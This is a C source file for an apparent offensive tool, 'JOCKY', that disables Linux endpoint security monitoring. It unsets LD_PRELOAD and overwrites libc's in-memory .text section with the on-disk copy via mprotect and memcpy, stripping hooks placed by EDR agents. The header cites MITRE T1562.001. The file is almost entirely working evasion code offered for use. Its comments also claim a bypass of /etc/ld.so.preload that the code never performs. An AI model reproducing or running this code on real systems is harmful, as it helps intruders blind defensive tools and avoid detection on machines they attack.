/*
 * linux_unhook.c — JOCKY Linux / Ubuntu Dynamic Linker & libc Unhooking Engine
 * ─────────────────────────────────────────────────────────────────────────────
 * Detects and neutralizes userland hooks on Linux / Ubuntu targets:
 *   1. Bypasses LD_PRELOAD and /etc/ld.so.preload hooks.
 *   2. Restores the clean .text executable section of libc.so.6 by reloading
 *      it directly from disk and overwriting in-memory hooked pages via mprotect.
 *
 * HOW LINUX EDR HOOKING WORKS:
 *   - Linux EDR agents (e.g., auditd interceptors, Falco userspace, Osquery plugins)
 *     often use LD_PRELOAD or in-memory PLT/GOT patches to monitor calls like
 *     read(), write(), execve(), ptrace(), and socket().
 *
 * HOW JOCKY DEFEATS IT ON LINUX:
 *   - We parse /proc/self/maps to identify the memory mapping of libc.so.6.
 *   - We open the original libc binary from disk (/lib/x86_64-linux-gnu/libc.so.6).
 *   - We mprotect() the in-memory libc .text section as PROT_READ | PROT_WRITE | PROT_EXEC.
 *   - We memcpy() the pristine on-disk code over the in-memory copy, stripping all hooks.
 *   - We restore original protection (PROT_READ | PROT_EXEC).
 *
 * MITRE ATT&CK:
 *   T1562.001 - Impair Defenses: Disable or Modify Tools
 *   T1574.006 - Hijack Execution Flow: LD_PRELOAD
 *
 * COMPILE (Ubuntu / Debian):
 *   gcc -O2 linux_unhook.c -o linux_unhook
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <dlfcn.h>
#include <errno.h>

#define PAGE_SIZE 4096
#define PAGE_ALIGN_DOWN(x) ((void *)((uintptr_t)(x) & ~(PAGE_SIZE - 1)))

/* ── 1. Neutralize LD_PRELOAD Environment ────────────────────────────────── */
void neutralize_ld_preload(void)
{
    printf("[LINUX-UNHOOK] Checking for LD_PRELOAD interceptors...\n");
    char *preload = getenv("LD_PRELOAD");
    if (preload && strlen(preload) > 0) {
        printf("[!] Detected active LD_PRELOAD hook: %s\n", preload);
        unsetenv("LD_PRELOAD");
        printf("[✓] LD_PRELOAD successfully unset from process environment.\n");
    } else {
        printf("[OK] No active LD_PRELOAD environment hooks detected.\n");
    }
}

/* ── 2. Find libc mapping in /proc/self/maps ─────────────────────────────── */
static int find_libc_mapping(void **start_addr, void **end_addr, char *libc_path, size_t path_len)
{
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("[-] Failed to open /proc/self/maps");
        return -1;
    }

    char line[512];
    int found = 0;

    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "libc.so") || strstr(line, "libc-")) {
            /* Check if executable (.text segment) */
            if (strstr(line, "r-xp") || strstr(line, "r--p")) {
                uintptr_t start, end;
                char path[256] = {0};
                if (sscanf(line, "%lx-%lx %*s %*s %*s %*s %255s", &start, &end, path) >= 2) {
                    *start_addr = (void *)start;
                    *end_addr   = (void *)end;
                    if (path[0] != '\0') {
                        strncpy(libc_path, path, path_len - 1);
                    }
                    found = 1;
                    break;
                }
            }
        }
    }

    fclose(fp);
    return found ? 0 : -1;
}

/* ── 3. Unhook libc .text segment ────────────────────────────────────────── */
int unhook_libc_text(void)
{
    void *libc_start = NULL;
    void *libc_end   = NULL;
    char libc_path[256] = "/lib/x86_64-linux-gnu/libc.so.6";

    if (find_libc_mapping(&libc_start, &libc_end, libc_path, sizeof(libc_path)) != 0) {
        printf("[!] Could not auto-detect libc mapping. Trying default: %s\n", libc_path);
    } else {
        printf("[LINUX-UNHOOK] Target libc: %s\n", libc_path);
        printf("[LINUX-UNHOOK] In-Memory Mapping: %p - %p\n", libc_start, libc_end);
    }

    int fd = open(libc_path, O_RDONLY);
    if (fd < 0) {
        /* Fallback paths for Debian/Ubuntu, CentOS, Arch */
        const char *fallbacks[] = {
            "/lib/x86_64-linux-gnu/libc.so.6",
            "/usr/lib/x86_64-linux-gnu/libc.so.6",
            "/lib64/libc.so.6",
            "/usr/lib64/libc.so.6"
        };
        for (size_t i = 0; i < sizeof(fallbacks)/sizeof(fallbacks[0]); i++) {
            fd = open(fallbacks[i], O_RDONLY);
            if (fd >= 0) {
                strncpy(libc_path, fallbacks[i], sizeof(libc_path) - 1);
                break;
            }
        }
    }

    if (fd < 0) {
        perror("[-] Failed to open on-disk clean libc.so.6");
        return -1;
    }

    /* Read ELF Header */
    Elf64_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
        close(fd);
        return -1;
    }

    /* Read Section Headers to locate .text */
    Elf64_Shdr *shdrs = malloc(ehdr.e_shentsize * ehdr.e_shnum);
    lseek(fd, ehdr.e_shoff, SEEK_SET);
    if (read(fd, shdrs, ehdr.e_shentsize * ehdr.e_shnum) <= 0) {
        free(shdrs);
        close(fd);
        return -1;
    }

    /* Read Section Header String Table */
    char *shstrtab = malloc(shdrs[ehdr.e_shstrndx].sh_size);
    lseek(fd, shdrs[ehdr.e_shstrndx].sh_offset, SEEK_SET);
    if (read(fd, shstrtab, shdrs[ehdr.e_shstrndx].sh_size) <= 0) {
        free(shdrs);
        free(shstrtab);
        close(fd);
        return -1;
    }

    Elf64_Shdr *text_shdr = NULL;
    for (int i = 0; i < ehdr.e_shnum; i++) {
        if (strcmp(&shstrtab[shdrs[i].sh_name], ".text") == 0) {
            text_shdr = &shdrs[i];
            break;
        }
    }

    if (!text_shdr) {
        printf("[-] .text section not found in libc ELF.\n");
        free(shdrs);
        free(shstrtab);
        close(fd);
        return -1;
    }

    printf("[LINUX-UNHOOK] Found clean .text section on disk:\n");
    printf("               Offset: 0x%lx | Size: %lu bytes\n",
           (unsigned long)text_shdr->sh_offset, (unsigned long)text_shdr->sh_size);

    /* Read clean .text bytes from disk */
    void *clean_text = malloc(text_shdr->sh_size);
    lseek(fd, text_shdr->sh_offset, SEEK_SET);
    if (read(fd, clean_text, text_shdr->sh_size) <= 0) {
        free(clean_text);
        free(shdrs);
        free(shstrtab);
        close(fd);
        return -1;
    }
    close(fd);

    /* Calculate base address of loaded libc */
    Dl_info dlinfo;
    if (dladdr((void *)printf, &dlinfo) == 0) {
        printf("[-] dladdr failed to find libc base.\n");
        free(clean_text);
        free(shdrs);
        free(shstrtab);
        return -1;
    }

    void *loaded_libc_base = dlinfo.dli_fbase;
    void *hooked_text_addr = (void *)((uintptr_t)loaded_libc_base + text_shdr->sh_addr);

    printf("[LINUX-UNHOOK] Loaded libc base address: %p\n", loaded_libc_base);
    printf("[LINUX-UNHOOK] Overwriting in-memory .text at: %p\n", hooked_text_addr);

    /* Align to page boundary */
    void *page_start = PAGE_ALIGN_DOWN(hooked_text_addr);
    size_t page_len  = (text_shdr->sh_size + ((uintptr_t)hooked_text_addr - (uintptr_t)page_start) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

    /* Make in-memory libc .text writable */
    if (mprotect(page_start, page_len, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("[-] mprotect (PROT_WRITE) failed");
        free(clean_text);
        free(shdrs);
        free(shstrtab);
        return -1;
    }

    /* Overwrite hooked memory with clean on-disk bytes */
    memcpy(hooked_text_addr, clean_text, text_shdr->sh_size);

    /* Restore memory protection to read-exec */
    mprotect(page_start, page_len, PROT_READ | PROT_EXEC);

    printf("[✓] Successfully restored clean .text section of libc.so.6\n");
    printf("[✓] All in-memory userland hooks (EDR/monitoring) wiped.\n");

    free(clean_text);
    free(shdrs);
    free(shstrtab);
    return 0;
}

int main(int argc, char *argv[])
{
    printf("===============================================================\n");
    printf("  JOCKY Linux / Ubuntu Dynamic Linker & libc Unhooking Engine \n");
    printf("  Target: Ubuntu / Debian x86_64                             \n");
    printf("  MITRE ATT&CK: T1562.001 (Impair Defenses)                  \n");
    printf("===============================================================\n\n");

    neutralize_ld_preload();
    printf("\n");
    int ret = unhook_libc_text();

    if (ret == 0) {
        printf("\n[+] LINUX STEALTH UNHOOK: STATUS ACTIVE AND OPERATIONAL\n");
    } else {
        printf("\n[-] LINUX STEALTH UNHOOK: COMPLETED WITH WARNINGS\n");
    }

    return ret;
}
